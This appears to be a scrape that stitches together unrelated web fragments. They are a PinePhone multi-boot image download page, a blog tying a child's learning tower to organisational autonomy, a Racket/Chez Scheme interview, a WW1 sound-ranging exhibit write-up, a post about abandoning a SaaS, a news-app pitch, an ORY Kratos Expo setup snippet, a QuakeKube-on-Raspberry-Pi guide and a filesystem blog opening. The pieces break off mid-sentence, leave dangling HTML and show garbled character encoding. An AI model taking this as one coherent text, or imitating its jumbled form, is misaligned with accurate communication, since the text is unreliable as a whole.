</li><li>p-boot has more features, auto-repeat for volume keys, scrolling menu, reboot to eMMC OS, air-gapped boot mode, battery indicator.
</li><li>Newer kernel (5.10-rc5) with 60fps fix.
</li></ul>

<h2>Quirks</h2>

<p>Most distributions don't need any patching to work with my latest 5.10 kernel and to be well behaved denizens of the multi-boot image. Nevertheless, some files still needed to be overrided. You can see those in the project's GIT repository, bellow.

</p><h2>Download</h2>

<p>The image is distributed as a <a href="http://dl.xnux.eu/p-boot-multi-2020-11-23.torrent">torrent</a> due to its size.
Install some torrent software (suggestions: <a href="https://transmissionbt.com/">transmission</a>, <a href="https://www.qbittorrent.org/">qBittorrent</a>) and click the previous link to start the download.
Don't forget to let the torrent client run even after the download finishes so that other people can get the image too.
I only seed to the ratio of 10x at unlimited speed (1Gbit).

</p><p>The image is also available at: <a href="http://dl.xnux.eu/p-boot-multi-2020-11-23/">http://dl.xnux.eu/p-boot-multi-2020-11-23/</a> as a regular download.
 Download via HTTP is rate limited to 128 KiB/s. So if you want to get the image faster, use a torrent.

</p><p>There's also a mirror of the image by the discord user <b>uxes</b> at <a href="http://mirror.uxes.cz/dl.xnux.eu/">http://mirror.uxes.cz/dl.xnux.eu/</a>.

</p><h2>Installation</h2>

<p>Installation consists of decompressing image data (gzipped) and to the SD card's whole block device. For example you can use <code>zcat multi.img.gz | sudo dd of=/dev/sdcarddevice bs=1M</code> (if you know how to identify your SD card's block device).

		<p>I’m grateful to learn from my daughter. Be able to see how the brain develops and picks up new concepts, skills and words. Nowadays, I enjoy to sit down and watch her play. As a parent, I also need to help her to achieve her autonomy: emotionally, mentally and physically. It is the job, and my wife and I are navigating through it. There is not a guide on how to parent, and we discuss what is working and what is not working. Sometimes is just not the time for a new skill, other times our daughter doesn’t develop an interest for a particular activity. Well, we are all different, and that is what makes the world colourful!</p>

<p>Recently I was looking at one of the structures that we created to help our daughter to achieve her autonomy:</p>

<p><img src="https://www.joaorosa.io/images/assets/2020-11-25-organisational-structures-to-create-autonomy-what-i-ve-learned-from-my-daughter.jpg" alt="A tower, allowing my daughter to execute her tasks"></p>

<center>A learning tower, allowing my daughter to execute her tasks</center>

<p>Yes, you are seeing it right, we have what so-called a learning tower, allowing kids to achieve higher heights. They can climb and reach the countertops, with a high degree of safety. This one is on our bathroom, and she uses it to help her with her morning routine.</p>

<h3 id="what-the-heck-is-the-relationship-to-organisational-design">What the heck is the relationship to organisational design?!</h3>
<p>I can imagine that this is the question in your head. Well, I will continue to tell the story… We built the climbing towers after she started to walk without our help. My wife saw this concept in a parenting community, and we applied it. In the beginning, we asked our daughter if she wants to be in the climbing tower, and if she said yes, we would put her there. It was a “show and tell” type of style, given that it was a new concept to her. She used it for tasks such as brush her teeth, wash her hands, watch us cook, make a beverage. You can imagine the type of tasks.</p>

<p>What I observed across time, is that the brain embraced the concept, and when we nudge her for a task, let’s say, dinner, she would go to near the tower. It is a sign that she recognises the patterns, and knows the tools that can help her achieve the goal. Lately, she is proactive: we wake up in the morning, and she goes to the bathroom, climbs the tower and asks for her toothbrush. Most of the times, we don’t need to nudge her.</p>

<h3 id="applicability-to-organisations">Applicability to organisations</h3>
<p>With this story, I hope that I sparked your imagination. The bottom line is that as a manager, in a sociotechnical system, we should create structures that help people and teams to achieve their autonomy and agency. There is a wide range of practices, rituals and tools that can help, and all of them are context-dependent. To make it tangible, let’s say that you are a company with 375 people, and you are an online photo printing solution. The solution is in the cloud, and you take care of producing and deliver the photos worldwide. You have a diverse landscape, with custom software and standard hardware (printers). We rely on partners for the logistics operations, and you have a distributed workforce across the globe, to be close to the customers. You can picture other details… As director of software, you are responsible for the custom software that your customers are delighted for.</p>

<p>You can think about different practices, rituals and tools to help autonomy and agency within the company. Let’ explore some very concreate scenarios, which I hope you can relate with.</p>

<h5 id="onboarding-of-new-colleagues">Onboarding of new colleagues</h5>
<p>A new software engineer is hired. She will join one of the teams, and as part of the onboarding process, she has the starter pack, where she can find the information about the contact person for different operations. Information such as pension and salary declarations are requested to the HR department, vacations are booked in the internal portal, or the software development process can be consulted in the wiki. There is also a public schedule of the different rituals of the teams, such as demos.</p>

<p>The starter pack allows her to have an idea about the owners of different information and processes, allowing her to be autonomous. How many times did we move between jobs and at the same move between time houses? The real state agencies require a lot of paperwork, and most of it is provided by our employer.</p>

<h5 id="communities-of-practice">Communities of practice</h5>
<p>The company is growing, and the software was a monolith, managed by two teams, is now a distributed set of services. The services are loosely coupled and operated by 15 teams. As the complexity of the system increases, the teams adopted principles of observability, and they nail logging and metrics. However, they want to invest in tracing, to increase their capabilities, and streamline the development and operations processes.</p>

<p>As such, a community of practice was created. People from different teams come together, and work on common problems, with the end in mind. It allows space to co-create, diverge and converge, experiment, until patterns and practices start to emerge, and are useful to the different teams. Other community practices can exist and be in different areas. This is not a “or” exercise, is more like a “and” one.</p>

<p>Communities of practice enable agency of teams, where they can continue to align with the organisation purpose, but devise their own way to execute their mission.</p>

<h5 id="a-new-service-is-added-to-the-landscape">A new service is added to the landscape</h5>
<p>The company is leveraging cloud services for the last 7 years, but recently they start to move their services from infrastructure-as-a-service to cloud-native, where applicable. It has an impact on the services and the way they are bootstrapped and wired. The platform team created a few templates with different goals: on one side how to migrate the services when the paradigm changes, and on the other side if you do a new service what are the barebones to bootstrap the basics (authentication, authorisation, monitoring, etc.)</p>

<p>Having these templates, a team reduce their lead time to create a new service. The templates and documentation allow them to understand how things are wired and how cloud-native can be leveraged. Once again, the teams can maintain their agency, reducing the burned over the platform team for the creation of new services. Also, there is a change for evolution, as teams can contribute to the templates, co-evolving them as new insights are generated.</p>

<h3 id="organisations-are-complex-sociotechnical-systems">Organisations are complex sociotechnical systems</h3>
<p>My goal with the examples is to provide some relatable scenarios, and I believe that stories are a great vehicle to convey a message. However, stories are context bounded, and the way that people or teams achieve something might not be feasible in a different context. Thus, my statement that ** organisations are complex sociotechnical systems**, and as a manager, we need to be aware of the complexity theory and how to navigate the inherent complexity.</p>

<p>I’m a student of complexity theory, and Cynefin, the work of <a href="https://twitter.com/snowded">Dave Snowden</a>. Cynefin framework is a sense-making framework, allowing us to make sense of the world. I will not go into the details of Cynefin, this is not the goal of the blog post, nor I’m a specialist. I’m just a student.</p>

<p>My point is that you can use Cynefin to make sense of the different needs of your organisation and help people to set-up the additional structures to create agency and autonomy. A great story that exemplifies it is “Cultivating Leadership with Cynefin: from tool to mindset” from Jennifer Garvey-Berger, Carolyn Coughlin, Keith Johnston and Jim Wicks, in the book <a href="https://www.cognitive-edge.com/cynefin-weaving-sense-making-into-the-fabric-of-our-world/">Cynefin, weaving sense-making unto the fabric of our world</a>. In this story, they show us how an organisation grow, and what were the structures that they added to allow the autonomy of the consultants, allowing their consultancy practice to evolve - a prime example of a Teal organisation.</p>

<p>Sometimes organisational structures to create autonomy and agency are not used on the spot. You need to nudge the system, observe and reflect. Sometimes the concept is new, and people and teams are getting used to it, trying to find the applicability. Other times, the structure is useless, and if that is the case just discard it. As I wrote in the beginning, our daughter got used to the learning tower, and across time increased her autonomy.</p>

<p>I hope this sparked some ideas with you. What are the organisational structures that allow autonomy and agency in your company?</p>

What makes it stand out in the LISP family?</strong></h2><p id="b428">Let’s distinguish “Racket the language” and “Racket the project”.</p><p id="f2e2">The Racket language is a general-purpose, Scheme-like language with an especially rich set of constructs for extending the language — even by Scheme standards. Racket includes support for writing quick-and-dirty macros, but it also supports nice macros with a good error checking that avoid surprising errors created in the expanded code. The close integration of macros and modules, an enforced phase separation between run-time and compile-time code, and the `#lang` mechanism for selecting the surface syntax all distinguish Racket from other Lisp variants.</p><p id="d48e">Even the main language Racket is written in a simpler language, and that is written in an even more simple language. This tower of languages makes development easier. You can look under the hood and see all the internal languages, or just ignore all of them and get a nice high level language.</p><p id="36f0">Less prominent, but also as important in practice for building language abstractions and composing them into large systems, are Racket’s run-time constructs: first-class control with continuation marks, custodians for simple and reliable task termination, reachability-based memory accounting, message-based parallelism via places, and Concurrent ML-style constructs for event-driven programs. Many of these constructs need support at lower levels of the runtime system, but then they can be used to build a wide variety of languages and libraries that mesh well.</p><p id="cb77">The Racket project synthesizes research, production, and education efforts toward the overall language-building goal. The idea of “A Programmable Programming Language” serves along those directions, from building student-friendly learning environments to domain-specific languages in application to pushing the frontiers of language design and implementation.</p><p id="a39d">The main page is <a href="https://racket-lang.org/" rel="noopener">https://racket-lang.org/</a></p><h2 id="47bc"><strong>What does it mean that you can write your own language?</strong></h2><p id="8534">For example, when you install Racket, it comes with 20 or 30 additional languages. (I’m not sure if someone has counted all of them.)</p><p id="adb8">There are a few “Student” languages that are designed for students. They are less powerful but have more compile time checks to detect common errors in beginners. And they have different levels so once you master one, you can use the next one that includes more features.</p><p id="e7f1">Another language is Typed Racket, that adds types to the Racket expressions, so it refuses to compile unless the types check. And it also uses the type information to optimize the code, so the compilation is slower, but the generated code can be faster.</p><p id="b5fa">There are languages that implement the version of Scheme in R5RS and R6RS and many of the SRFI. And you can install a package that adds the version in the R7RS-small.</p><p id="8dd3">And there are also more different languages with a very different syntax like a complete implementation of Algol 60.</p><p id="d422">All these languages share the same backend and you can call the libraries written in one language from any of the other languages that are included in the distribution, the additional languages you can download as packages, or the languages you create.</p><p id="7932"><strong>What’s the difference between Racket and Scheme?</strong></p><p id="f375">Racket started out as a Scheme implementation, and we would still call it “a Scheme.” Even though it does not fit a Scheme standard, it’s obviously derived from Scheme. There are many specific differences, such as the fact that `cons` always creates an immutable pair in Racket, but the main difference is philosophy: Scheme is meant to be a small language that gives you just enough to express lots of things. Racket is meant to be a big language, and while it gives you the same core pieces (and more) that can express lots of things, it also codifies the way many things are done to enable more cooperating libraries and languages.</p><h2 id="0256"><strong>What is Chez Scheme, how is it different from other Scheme implementations?</strong></h2><p id="1fb3">Chez Scheme is one of the oldest Scheme implementations, and its evolution informed many parts of the Scheme standard through R6RS. (Racket’s influence on the Scheme standard, in contrast, is limited to aspects of the R6RS library design.) Chez Scheme is a relatively small language, but like all instantiations of Scheme, the implementation provides a lot more than the standard specifies.</p><p id="3c1c">Chez Scheme’s biggest claim to fame is its performance. It has always been among the best-performing Scheme implementations. Its object-tagging and allocation regime, its hybrid stack–heap implementations of continuations, and its compiler structure all remain state-of-the-art, even in 2020.</p><p id="3095">For most of its existence, Chez Scheme was a proprietary, closed-source implementation, but it became open source in mid-2016. As it happens, we started considering a new Racket reimplementation around the start of 2017.</p><h2 id="54ea"><strong>Why did you choose Chez Scheme over other Schemes to rebuild Racket?</strong></h2><p id="db07">The biggest weakness of the Racket BC (“before Chez”) implementation are its back-end compiler structure, its inefficient internal calling conventions (over-adapted to C), and its poor implementation of first-class continuations. Those are exactly the strengths of Chez Scheme. Furthermore, Racket’s evaluation model was always closely aligned with Chez Scheme, such as the emphasis on interactive evaluation and compilation.</p><p id="d9a4">It was clear up front that Chez Scheme lacked significant features that Racket needs, such as support for continuation marks and reachability-based memory accounting. However, the high quality of the Chez Scheme design and implementation, in contrast to old Racket’s implementation, made adapting Chez Scheme more appealing than retrofitting Racket’s old implementation further.</p><h2 id="28e7"><strong>Why reimplement with Chez Scheme to reduce the C part instead of implementing the C stuff in Racket?</strong></h2><p id="2658">Mostly, we did reimplement the C stuff in Racket. The I/O subsystem, the concurrency subsystem (which includes the scheduler for “green” threads, Concurrent ML-style events, and custodians), and the regexp matcher were all rewritten in Racket. Those pieces followed the rewrite of the macro expander in Racket. Other things that needed to be moved out of C, such as the compiler and the extensive support for numbers that Racket inherited from Scheme, were already written in Scheme in Chez Scheme’s implementation.</p><p id="b995">A big part of the process was to understand what to implement in Racket, what in Chez Scheme, and what new layers to introduce in translation. This work and reorganization benefits other Racket implementation efforts, such as Pycket and RacketScript.</p><h2 id="de40"><strong>Besides improving maintainability, what are the advantages of building Racket with CS over C?</strong></h2><p id="4952">With the exception of the garbage collector and similar low-level parts of the runtime system, much of Racket’s implementation benefits from higher-level abstractions. Writing a macro expander in C was a particularly poor choice, since higher-level abstractions obviously make tree manipulations easier, but the same reasons apply for the I/O layer or numeric primitives. Even the garbage collector in [the Racket variant of] Chez Scheme is now half implemented by a specification and compiler that are written in Scheme.</p><p id="60db">The other big advantage is that the Racket community has a lot of Racket programmers, not C programmers. It’s easier to convince a fan of Racket to look at some code in Racket or Chez Scheme and try to find some bug or a new feature to contribute. The people that like to read and write code in C are probably making contributions to a C compiler.</p><h2 id="e706"><strong>What were the most challenging parts to implement?</strong></h2><p id="971c">The most challenging part is not really one part, but the overall scale. Racket is a big language, and it all has to work the same in the new implementation. That means not just getting the right result and/or a specific kind of error message, but getting results with the same or better performance characteristics. For example, if a macro generates a giant expansion that nevertheless compiles in reasonable time in Racket BC, then it needs to compile in reasonable time in Racket CS.</p><p id="c985">When it comes to specific pieces that we had to implement, perhaps the most challenging were adding type reconstruction to the compiler, adding support for continuation marks, allowing record values to act as procedures, reimplementing Racket’s I/O, and upgrading Chez Scheme’s …</p></div></div></section></div>

The sound ranging equipment used six tuned low frequency â€˜<a href="https://royalsocietypublishing.org/doi/abs/10.1098/rsta.1921.0011">microphones</a>â€™</span><span> (indicated by the six parallel lines on the film) arranged in a wide arc behind allied lines. The microphones were connected to a string galvanometer at a forward listening position. A low frequency signal picked up by one of these microphones would move a thin wire in the galvanometer and cast a shadow onto a piece of moving film.</span></p><p><span>The equipment takes advantage of both the consistency and relative difference between the speed of sound and the speed of light to create a visual recording of the sound impulses which would arrive at the microphones after the flash of the guns being fired. An operator would wait for the flash of an enemy gun to start the film rolling and the equipment would record the signals as they arrived progressively based on their proximity to the impulse source. </span></p><p><span>The film took around five minutes to develop after which trained analysts could decode the patterns on the film and use them to work out the positions of enemy guns using a process called <a href="https://en.wikipedia.org/wiki/Artillery_sound_ranging#cite_note-LawCosines-2">multilateration</a></span><span>.</span></p><p><span>By the end of WW1 sound ranging techniques could locate enemy guns within 25m to 50m under normal atmospheric conditions and even determine the <a href="https://www.aif.adfa.edu.au/OrderOfBattle/Thesis/index.html">caliber, number of guns and the target</a></span><span>. &nbsp;The document above gives us a great insight into how intense and chaotic the barrage of gunfire must have been to those fighting. The missing section that has been edited out of the film in the middle of the image also begs the question â€œwhat would those 2 minutes have sounded like?â€�</span></p><p><b>Forensic sound</b></p><p><span>Using this document, the team at IWM were keen for us to try and create an interpretation of how this â€˜missingâ€™ moment might have sounded as the introduction to a series of exhibitions they were working on to commemorate the centenary of the end of the First World War.</span></p><p><span>In order to go about creating a reconstruction, we had do a bit of â€˜forensicâ€™ work, corroborating historical information about the type of artillery that would have been in use by the US, German and French armies at this point in the war, with what the visual information from the sound ranging film tells us about the size, distance and frequency of blasts and finally, interpreting the kind of reverberation you would have expected to hear by looking at landscape photographs and archive film footage from the front.</span></p><p><span>As its basis, our reconstruction uses contemporary recordings of the Howitzer, Mauser, Stokes, Vickers and Lee Enfield guns made for the purposes of sound design in film and television</span><span>. These recordings were then grouped and triggered according to who was using them and in patterns that corresponded to archive <a href="https://www.youtube.com/watch?v=q2lGzfuJaok">newsreel</a> <a href="https://www.youtube.com/watch?v=aMf5MmicGlQ">footage</a> taken at the front</span><span>. The density of the gunfire was interpreted both from the sound ranging document and further archive footage. All of these elements were mixed together relative to each other and with respect to the distances over which the fighting was taking place. Finally, a convolution reverb</span><span> with an impulse response recorded in a relative â€˜free fieldâ€™ scenario was used to simulate the space and dispersion of the sound across the front</span>.</p><p><strong>Feeling sound: bone conduction</strong></p><p><span>The team at IWM were very keen to present this unique document and our reconstruction in a way that would not only bring them to life, but also make explicit the relationship between them for visitors. With this in mind, we drew inspiration from the mechanics of the â€˜sound rangingâ€™ equipment itself.</span></p><figure id="attachment_1477" aria-labelledby="figcaption_attachment_1477"><picture><source srcset="https://codatocoda.com/mainsite/wp-content/webp-express/webp-images/doc-root/mainsite/wp-content/uploads/2018/10/800px-French_sound_ranging_recorder.jpg.webp 800w, https://codatocoda.com/mainsite/wp-content/webp-express/webp-images/doc-root/mainsite/wp-content/uploads/2018/10/800px-French_sound_ranging_recorder-300x225.jpg.webp 300w, https://codatocoda.com/mainsite/wp-content/webp-express/webp-images/doc-root/mainsite/wp-content/uploads/2018/10/800px-French_sound_ranging_recorder-768x576.jpg.webp 768w, https://codatocoda.com/mainsite/wp-content/webp-express/webp-images/doc-root/mainsite/wp-content/uploads/2018/10/800px-French_sound_ranging_recorder-450x338.jpg.webp 450w, https://codatocoda.com/mainsite/wp-content/webp-express/webp-images/doc-root/mainsite/wp-content/uploads/2018/10/800px-French_sound_ranging_recorder-225x169.jpg.webp 225w" sizes="(max-width: 1000px) 900px, 900px" type="image/webp"><img src="https://codatocoda.com/mainsite/wp-content/uploads/2018/10/800px-French_sound_ranging_recorder.jpg" alt="" width="447" height="335" srcset="https://codatocoda.com/mainsite/wp-content/uploads/2018/10/800px-French_sound_ranging_recorder.jpg 800w, https://codatocoda.com/mainsite/wp-content/uploads/2018/10/800px-French_sound_ranging_recorder-300x225.jpg 300w, https://codatocoda.com/mainsite/wp-content/uploads/2018/10/800px-French_sound_ranging_recorder-768x576.jpg 768w, https://codatocoda.com/mainsite/wp-content/uploads/2018/10/800px-French_sound_ranging_recorder-450x338.jpg 450w, https://codatocoda.com/mainsite/wp-content/uploads/2018/10/800px-French_sound_ranging_recorder-225x169.jpg 225w" sizes="(max-width: 1000px) 900px, 900px"></picture><figcaption id="figcaption_attachment_1477">A French ‘sound ranging’ system from 1920s</figcaption></figure><p><span>The â€˜sound rangingâ€™ equipment that was deployed at the end of &nbsp;WW1 used an innovative Low Frequency Microphone developed by <a href="https://en.wikipedia.org/wiki/William_Sansome_Tucker">William Sansome Tucker</a></span><span> in 1916. &nbsp;This microphone used a Helmholtz resonator to detect the physical vibrations of low frequencies of the guns in order to record them onto film</span><span>.</span></p><p><span>The physicality of â€˜sound rangingâ€™ and the fact that the explosions of the guns firing would have been felt as shock waves by soldiers at the same time as being heard led us to the idea of trying to incorporate bone conduction into the exhibit, as a way of tying together our reconstruction with the physicality of â€˜sound rangingâ€™.</span></p><p><strong>How does bone conduction work?</strong></p><p>Normally sound waves reach our ears as vibrations travelling through the air to our eardrums, and then on to the Cochlea or inner ear, which is connected to the auditory nerve that transmits the sounds to our brain.</p><p>However, the ear is a very sensitive organ and it can also pick up vibrations through our skulls. The most obvious example of this is when you go to the dentist and have your teeth cleaned. Dentists often use electric polishers, these polishers make a sound that can be heard in the room, but also, when applied to your teeth and transmitted through your skull, heard directly through the process of ‘bone conduction’.</p><figure id="attachment_1481" aria-labelledby="figcaption_attachment_1481"><picture><source srcset="https://codatocoda.com/mainsite/wp-content/webp-express/webp-images/doc-root/mainsite/wp-content/uploads/2018/10/large.jpg.webp 442w, https://codatocoda.com/mainsite/wp-content/webp-express/webp-images/doc-root/mainsite/wp-content/uploads/2018/10/large-300x205.jpg.webp 300w, https://codatocoda.com/mainsite/wp-content/webp-express/webp-images/doc-root/mainsite/wp-content/uploads/2018/10/large-225x154.jpg.webp 225w" sizes="(max-width: 1000px) 900px, 900px" type="image/webp"><img src="https://codatocoda.com/mainsite/wp-content/uploads/2018/10/large.jpg" alt="" width="442" height="302" srcset="https://codatocoda.com/mainsite/wp-content/uploads/2018/10/large.jpg 442w, https://codatocoda.com/mainsite/wp-content/uploads/2018/10/large-300x205.jpg 300w, https://codatocoda.com/mainsite/wp-content/uploads/2018/10/large-225x154.jpg 225w" sizes="(max-width: 1000px) 900px, 900px"></picture><figcaption id="figcaption_attachment_1481">Laurie Anderson, Handphone Table, 1978.</figcaption></figure><p>The logic of ‘bone conduction’ is that anything that vibrates can be put directly on your head and heard through your skull.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I made a big mistake.</p><p>It was at the end of December of 2019, and I started working right away on my idea. A platform to send newsletters.</p><p>I spent six months working on it. Every day. From Monday to Sunday, until I had an MVP. I was very proud of what I created, and I wanted to share it with the world.</p><p>The results: Zero clients.</p><p>I was expecting people to try it, at least out of curiosity or to think about using it. But no one did.</p><p>Is the project a failure because I have zero clients?</p><p>1 - The site only had around 4K visits so far. That's not enough.<br>2 - From those people, 99% were visits from places like Indie Hackers, Product Hunt, BetaList, etc. Are they my clients? Maybe not.</p><p>I have two big reasons to consider this a failure.</p><h3><strong>1 - I still need to put in twelve more months of work</strong>.</h3><p>To add paid newsletters, static pages, a better writing editor, a blogging experience, custom domains…. If I want to create those, I need to spend at least another 12 months. Probably more.</p><p>And for what? Adding more features is not going to help with finding clients because they won't see them.</p><h3><strong>2 - I need to find clients</strong>.</h3><p>I am sure that you can make a lot of money from a service like this. </p><p>The problem is, if I code, I can't do sales or marketing. It seems to me that there are at least 3 full-time jobs to do simultaneously, and that's too big for me.</p><p>I was naive when I started.</p><h2><strong>What was my big mistake?</strong></h2><p>I wanted to create a Micro-Saas. I wasn't looking to be a big company. I thought to have 500-1000 clients and make 10/20K per month.</p><p>I wanted to create a family business. Pay salaries for a couple of people and flying low. I wasn't looking for attention. I didn't want to be the greatest entrepreneur.</p><p>My big mistake was to think that creating a SaaS was easy. At least easier. I was expecting to have 50/100 clients in the first couple of months. I thought: "Internet is big, they will come."</p><p>And there is some truth to that, but I learned after that you need to find them. Or spend money on ads. Or both.</p><p>And I don't know how to do it, and I don't have a budget for that or the experience.</p><h3><strong>What do I mean by "I quit"?</strong></h3><p>I quit big projects that keep me attached to my desk for years and infinity hours. Projects that you can never say: done. A SaaS is never done.</p><p>Last week I created and launched&nbsp;<a href="http://slideslist.com/">slideslist.com</a>. It took me a week to create it. It had some visits and no sales, but it doesn't matter. No risks were taken and minimal effort.</p><h3>How to know if you should start a project?</h3><p>If you are starting today, you should start small. It would be best if you learn first. Start by creating a SaaS is too big and risky in time, money, and effort or even Micro-SaaS. The "micro" doesn't reflect the effort you need to put in anyway.</p><p>Create something small in less than a month and try to sell it. You will see how hard it is and how many people tell you: "nice! I will take a look later" And they will never do. So then you learn, and you keep trying small things until you have enough experience.</p><p>Even enough experience to realize that creating a SaaS is not for you. Like I learned.</p><h2><strong>Do You Need to Create a SaaS?</strong></h2><p>I’d say probably not, but I am still figuring this out.</p><p>I started this to be free. And being free involves, of course, having more money. But I don't want to buy a fancy car or a big house. You can make a lot of money from a SaaS, but there are also other ways to make money online. </p><p>The problem with the SaaS I was creating is that I was giving away my freedom by doing things that I wasn't enjoying. But I didn't want to spend every single hour of the day adding more features and at the same time trying to find clients.</p><p>If that's what you want, that's fantastic, go ahead and start a SaaS. But that's not what I wanted.</p><p>I romanticized the idea of travel and writing. And that's what I want. I wanted to make money to write, to share lessons on the things that I think are valuable for people to have a better and more balanced life.</p><p><strong>Know yourself.</strong></p><p>If I wanted to write, why was I spending my time creating a SaaS?</p><p><strong>Now I am writing, and let’s see from here.</strong></p><p>Thanks to this&nbsp;<a href="https://www.indiehackers.com/post/after-losing-38676-as-an-indie-hacker-i-cant-do-it-anymore-i-quit-8673223598">article</a>&nbsp;I published telling my story I learned that I might not have to create a SaaS to start living the life I want.</p><p>People paid me for it, and I made a good amount of money. It paid my rent for the month, and that blew my mind.</p><p>So I decided to start a newsletter and a blog and start writing about the things I enjoy. Who knows if in the future I will go back again trying to create a big project, but for now, I’m going to try something small that is also fun to do for me. </p><p>👉&nbsp;If you liked this article, share it with your friends!

                    <p>How did you end up on this page? &nbsp;If I were a betting man, I would guess that you clicked on a link posted on an &nbsp;aggregator or social media.</p><p>While I appreciate the &nbsp;click (it's always nice to see you) is this the best way to read news?</p><p>Social media and aggregators work in favor of blog posts like this. &nbsp;(And please upvote us.) &nbsp;But for news, they incentivize the wrong things. &nbsp;We know what most people want to share and what gets the most eyeballs and hard news generally is not it. (Outrage porn, anyone?) This is especially true if it is local news and only of interest to a small area.</p><p>Aggregators can give the illusion of informing: you can simply scan the headlines and go on with your day. &nbsp;After all, you just caught up on the news! &nbsp;But this is unsustainable -- smaller organizations that cover local areas are left out of lucrative licensing deals, and without click-throughs to articles, reporters and news organizations have no opportunity to display ads; leading to several generally hated internet phenomena: clickbait, overloading pages with ads, and paywalls to compensate for lost revenue.</p><p>We’re turning the current incentive structure on its head by rewarding original reporting. &nbsp; We publish concise updates from reporters you trust. We make <a href="https://www.nillium.com/newsrooms">tools for newsrooms</a> that syndicate dispatches to a consumer app instantly. (We like to think of ourselves as being to news what OpenTable is to restaurants.) And through rev-shares, our partners succeed when we do.</p><p>We also hope that this surfaces up and coming journalists. &nbsp;Local news reporters are incredibly talented, and know their communities well; even if the communities do not always know them. &nbsp;Rather than require the name recognition as a barrier to entry for a paid newsletter, we want to help them make a name for themselves, while also sharing revenue back to them. &nbsp;</p><p>This is where the news industry should be headed. We need your help -- please <a href="https://www.forthapp.com/list.html">sign up for our waiting list</a> so we can alert you when we’re live in your area, and help us bring on local publishers.</p><p>Let’s Go Forth.</p>

will not cover React fundamentals and focus on implementing login, registration
and so on.</p><p>To make things a bit easier, we will use <a href="https://expo.io/"><code>expo</code></a>. At a
minimum, you need NodeJS and NPM installed locally. We will use the ORY Kratos
React Native Login, Registration and Profile Management template:</p><div data-language="shell-session"><pre><code><span><span>$</span> <span><span>npm</span> <span>install</span> -g expo-cli</span></span>
<span><span>$</span> <span>expo init login-signup-app -t @oryd/expo-login-registration-template --npm</span></span>

<span><span>#</span> <span>We also want to <span>install</span> and initialize all required components:</span></span>
<span><span>$</span> <span><span>cd</span> login-signup-app</span></span>
<span>~/login-signup-app</span><span><span>$</span> <span><span>npm</span> i</span></span>
<span>~/login-signup-app</span><span><span>$</span> <span><span>npm</span> run expo-install</span></span>
<span><span>#</span> <span>For iOS you also need to run:</span></span>
<span>~/login-signup-app</span><span><span>$</span> <span><span>npm</span> run pod-install</span></span></code></pre></div><p>In case you want to just start exploring, simply run:</p><ul><li><code>npm start</code> opens a dashboard where you can open iOS, Android, or web.</li><li><code>npm run android</code> opens the app as an android app (requires a connected
android VM or device).</li><li><code>npm run ios</code> opens the app in the iOS simulator (works only on mac OSX).</li><li><code>npm run web</code> opens the app as a browser app.</li></ul><p><span>

<p>Yesterday I saw this tweet of Chris Campbell passing by in my timeline:</p>



<p>Aah, the memories. Quake III Arena, one of my favourite first-person shooter games.</p>

<p>Years ago, I spent (and lost) so much time playing this fast-paced game with friends and foes, and now it is brought into the world of containers and Kubernetes with <strong><a href="https://github.com/criticalstack/quake-kube" target="_blank">QuakeKube</a></strong> by <a href="https://twitter.com/CapitalOneTech" target="_blank">Capital One Tech</a>.</p>

<blockquote>
<p><em>QuakeKube is a Kubernetes-ified version of</em> <a href="https://github.com/inolen/quakejs" target="_blank"><em>QuakeJS</em></a> <em>that runs a dedicated</em> <a href="https://en.wikipedia.org/wiki/Quake_III_Arena" target="_blank"><em>Quake 3</em></a> <em>server in a Kubernetes Deployment, and then allow clients to connect via QuakeJS in the browser.</em></p>
</blockquote>

<p>Of course, I couldn’t wait to give it a try, especially after reading the documentation, saying:</p>

<blockquote>
<p><em>Container images are being cross-compiled with</em> <a href="https://docs.docker.com/buildx/working-with-buildx/" target="_blank"><em>Docker Buildx</em></a> <em>so it can run on hardware with different architectures and operating systems. Currently, it is building for <code>linux/amd64</code> and <code>linux/arm64</code>.</em></p>
</blockquote>

<p><strong>ARM64 support!</strong> Great, it means I can run it on one of my Raspberry Pis!</p>

<h2 id="let-s-get-fragging">Let’s get fragging!</h2>

<p>Most of the work is already done by others, so with the proper tools and projects, it will take you only a few minutes to get everything up and running.</p>

<h3 id="prerequisites">Prerequisites</h3>

<ul>
<li>a Raspberry Pi with Ubuntu 20.04, which supports arm64<br></li>
<li><code>k3sup</code>, a light-weight utility to get from zero to KUBECONFIG with k3s on any local or remote VM.<br></li>
<li><code>arkade</code>, a simple Golang CLI with strongly-typed flags to install charts and apps to your cluster in one command.<br></li>
<li><code>kubectl</code><br></li>
<li>a DigitalOcean account and an API Token</li>
</ul>

<h3 id="installation">Installation</h3>

<p>First, install <code>k3s</code> on your Raspberry Pi running a arm64 OS like Ubuntu 20.04</p>
<div><pre><code data-lang="bash">$ k3sup install --ip <span>192</span>.168.0.52 --user ubuntu --k3s-extra-args <span>'--no-deploy servicelb --no-deploy traefik'</span></code></pre></div>
<p>After the installation of k3s on the Raspberry Pi, k3sup also downloads the required kubeconfig file in your current working directory.<br>
Make sure to configure <code>kubectl</code> to use this config file:</p>
<div><pre><code data-lang="bash">$ export KUBECONFIG<span>=</span><span>$(</span>pwd<span>)</span>/kubeconfig</code></pre></div>
<p>Next, install the inlets-operator with <code>arkade</code>:</p>
<div><pre><code data-lang="bash">$ arkade install inlets-operator --provider digitalocean --token-file ~/do-api-token</code></pre></div>
<p>The inlets-operator will create an inlets exit-node on DigitalOcean, giving the LoadBalancer services in the private k3s cluster a public IP address.</p>

<p>As clients connect to the server via QuakeJS in the browser with websockets, the OSS version of inlets will do just fine. If you want to have better support for TLS etc, I can highly recommend having a look at inlets PRO version.</p>

<p>Finally, take the example yaml file from the QuakeKube GitHub repository and make the appropriate changes. The service should be updated to a LoadBalancer instead of type NodePort, and of course you can change the configuration to tweak the game preferences to your own needs.</p>

<p>Example of a QuakeKube yaml file:</p>

<div data-o1-contenteditable="body" data-o1-contenteditable-format="html"><p>As we are talking about an image <i>file</i>, it comes natural to store it on the traditional <b>filesystem</b>. Unfortunately, traditional filesystems don't support transactions. Getting the security aspects right is hard. It's a challenge to make consistent backups given that you can't just stop the world. Inevitably, a traditional filesystem will be modified while you are working on the backup. Sooner or later this will cause problems.</p><p><b>Databases</b> can solve all of the above. They have transactions. If you do a backup, it will likely be consistent by default. The problem is, databases are bad with large objects. They are a bad choice if you want to serve lots of users.</p><p>This is really frustrating. Why can't we have a storage system that combines the best of both worlds?</p><p>I want this:</p></div>

<div data-o1-path="//boomla.com/blog/filesystem-and-database-are-not-cutting-the-problem-space-right/main/text-7"><div>




